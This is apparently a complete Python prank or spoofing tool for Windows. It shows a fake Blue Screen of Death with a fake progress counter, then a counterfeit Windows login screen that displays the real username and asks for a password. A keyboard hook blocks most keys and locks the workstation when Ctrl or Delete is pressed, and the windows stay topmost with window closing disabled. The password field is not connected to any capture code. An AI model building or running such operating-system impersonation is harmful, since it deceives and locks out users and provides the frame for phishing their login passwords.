import ctypes
import os
from PIL import ImageTk, Image, ImageDraw, ImageOps
import pyHook
import pythoncom
import random
import screeninfo
from sound import Sound
import threading
import time
import tkinter
from tkinter.font import Font


class KeyBlocker(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.start()

    def run(self):
        hook_manager = pyHook.HookManager()
        hook_manager.KeyDown = self.press
        hook_manager.HookKeyboard()
        pythoncom.PumpMessages()

    def press(self, event):
        if event.Key.lower() in ["lcontrol", "delete"]:
            ctypes.windll.user32.LockWorkStation()
        elif event.Key.lower() == "escape":
            return True
        return False


screen = tkinter.Tk()
screen.title("")
screen.iconbitmap("./images/transparent.ico")
monitors = screeninfo.get_monitors()
width, height = monitors[0].width, monitors[0].height
screen.geometry(str(width)+"x"+str(height))
screen.state("zoomed")
screen.overrideredirect(True)
screen.wm_attributes("-topmost", True)
screen.config(cursor = "none")

qr_code = tkinter.PhotoImage(file = "./images/qr_code.png")
background_image = ImageTk.PhotoImage(Image.open("./images/background.jfif").resize((width, height)))
error_codes_file = open("./documents/error_codes", "r")
error_codes = error_codes_file.readlines()

profile = Image.open("./images/user.png").resize((width//10, width//10))
mask = Image.new("L", (profile.size[0]*10, profile.size[1]*10), 0)
draw = ImageDraw.Draw(mask)
draw.ellipse((0, 0) + mask.size, fill = 255)
mask = mask.resize(profile.size, Image.ANTIALIAS)
profile = ImageOps.fit(profile, mask.size, centering = (0.5, 0.5))
profile.putalpha(mask)
profile = ImageTk.PhotoImage(profile)

font_big = Font(family = "Segoe UI Semilight", size = 150)
font_large = Font(family = "Segoe UI Light", size = 40)
font = Font(family = "Segoe UI Light", size = 30)
font_small = Font(family = "Segoe UI Light", size = 14)
font_tiny = Font(family = "Segoe UI Light", size = 10)

entry_font_big = Font(family = "Calibri", size = 16)
entry_font = Font(family = "Calibri", size = 12)

x_origin, y_origin = None, None
width_total, height_total = 0, 0
for monitor in monitors:
    if x_origin is None or monitor.x < x_origin:
        x_origin = monitor.x
    if y_origin is None or monitor.y < y_origin:
        y_origin = monitor.y
    width_total += monitor.width
    height_total += monitor.height

black = tkinter.Toplevel(screen)
black.configure(background = "black")
black.geometry(f"{width_total}x{height_total}+{x_origin}+{y_origin}")
black.overrideredirect(True)
black.config(cursor = "none")

bluescreen = tkinter.Canvas(screen, bd = 0, bg = "#0078D7", width = width, height = height)
bluescreen.place(x = -2, y = -2)
bluescreen.create_text(200, 150, anchor = "nw", fill = "white", font = font_big, text = ":(")
bluescreen.create_text(210, 420, anchor = "nw", fill = "white", font = font, text = "Your PC ran into a problem and needs to restart. We're\njust collecting some error info, and then we'll restart for\nyou.")
bluescreen.create_text(210, 620, anchor = "nw", fill = "white", font = font, text = "0% complete", tag="progress")
bluescreen.create_text(350, 725, anchor = "nw", fill = "white", font = font_small, text = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode")
bluescreen.create_text(350, 800, anchor = "nw", fill = "white", font = font_tiny, text = "If you call a support person, give them this info:")
bluescreen.create_text(350, 830, anchor = "nw", fill = "white", font = font_tiny, text = "Stop code: " + random.choice(error_codes).split(" ")[1])
error_codes_file.close()
bluescreen.create_image(210, 730, anchor = "nw", image = qr_code)


class IncreaseProgress(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self, *args, **kwargs)
        self.daemon = True
        self.progress = 0
        self.start()

    def run(self):
        while True:
            time.sleep(random.randint(1, 5))
            self.progress += random.randint(1, 20)
            if self.progress > 100:
                self.progress = 100
            bluescreen.delete("progress")
            bluescreen.create_text(210, 620, anchor = "nw", fill = "white", font = font, text = str(self.progress) + "% complete", tag = "progress")
            if self.progress == 100:
                time.sleep(random.randint(1, 5))
                bluescreen.destroy()
                black.wm_attributes("-topmost", True)
                time.sleep(random.randint(3, 10))
                black.wm_attributes("-topmost", False)
                create_login()
                break


def create_login():

    def entry_focus_in(_):
        entry_window.attributes("-alpha", 1)
        entry.config(foreground = "#999999", background = "#FEFEFE")
        entry.icursor(0)

    def entry_focus_out(_):
        entry_window.attributes("-alpha", 0.5)
        entry.config(foreground = "#FEFEFE", background = "#000000")

    def entry_enter(_):
        entry_frame.config(background = "#FEFEFE")

    def entry_leave(_):
        entry_frame.config(background = "#AAAAAA")

    screen.config(cursor = "arrow")
    background = tkinter.Canvas(screen, border = 0, width = width, height = height)
    background.place(x = -2, y = -2)
    background.create_image(2, 2, anchor = "nw", image = background_image)
    background.create_image(width/2, height/2-170, image = profile)

    # C:\Users\user\AppData\Roaming\Microsoft\Windows\AccountPictures
    username = os.getlogin()
    background.create_text(width/2, height/2, fill = "white", font = font_large, text = username)

    entry_window = tkinter.Toplevel()
    entry_window.bind("<FocusOut>", lambda _: entry_window.wm_attributes("-topmost", True))
    entry_window.overrideredirect(True)
    entry_window.resizable(False, False)
    entry_window.wm_attributes("-topmost", True)
    entry_window.attributes("-alpha", 0.5)
    entry_window.wm_geometry("+"+str(width//2-180)+"+"+str(height//2+90))
    entry_frame = tkinter.Frame(entry_window, border = 2, background = "#AAAAAA", relief = "flat")
    entry_frame.pack()
    entry_frame.bind
    password = tkinter.StringVar()
    entry = tkinter.Entry(entry_frame, width = 30, border = 8, foreground = "#FEFEFE", background = "#000000", relief = "flat", font = "Calibri", textvariable = password, exportselection = 0)
    entry.pack(side = "left")
    entry.bind("<FocusIn>", entry_focus_in)
    entry.bind("<FocusOut>", entry_focus_out)
    entry.bind("<Enter>", entry_enter)
    entry.bind("<Leave>", entry_leave)
    entry.insert(0, "Password")
    button = tkinter.Button(entry_frame, width = 3, border = 0, foreground = "#FEFEFE", background = "#777777", relief = "flat", font = entry_font_big, text = "→")
    button.pack(side = "right")

def ignore(event = None):
    return
screen.protocol("WM_DELETE_WINDOW", ignore)

screen.bind("<Escape>", lambda _: screen.destroy())


if __name__ == "__main__":
    #Sound.mute()
    KeyBlocker()
    #time.sleep(4)

    IncreaseProgress()
    screen.mainloop()
